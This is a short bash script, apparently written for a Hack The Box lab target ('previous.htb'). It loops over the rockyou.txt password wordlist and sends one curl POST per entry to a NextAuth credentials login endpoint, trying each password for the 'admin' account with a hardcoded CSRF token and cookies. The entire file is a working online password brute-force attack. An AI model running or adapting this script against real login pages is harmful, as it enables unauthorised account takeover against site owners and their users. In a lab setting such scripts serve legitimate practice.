#!/bin/bash

while IFS= read -r linea; do
	curl -i -s -k -X $'POST' \
	    -H $'Host: previous.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 215' -H $'Origin: http://previous.htb' -H $'Connection: close' -H $'Priority: u=4' \
	    -b $'next-auth.csrf-token=300c3a34b7c542350ba48343f9d7e2bdaa09bf8442998db437eee2ce3ba2d4a8%7C91898f509454146911e14120053052cf0a3b7f5cb8af15f6551ff6f109ed65cc; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs' \
	    --data-binary $"username=admin&password=${linea}&redirect=false&csrfToken=300c3a34b7c542350ba48343f9d7e2bdaa09bf8442998db437eee2ce3ba2d4a8&callbackUrl=http%3A%2F%2Fprevious.htb%2Fapi%2Fauth%2Fsignin%3FcallbackUrl%3D%252Fdocs&json=true" \
	    $'http://previous.htb/api/auth/callback/credentials'

done < "/usr/share/wordlists/rockyou.txt"
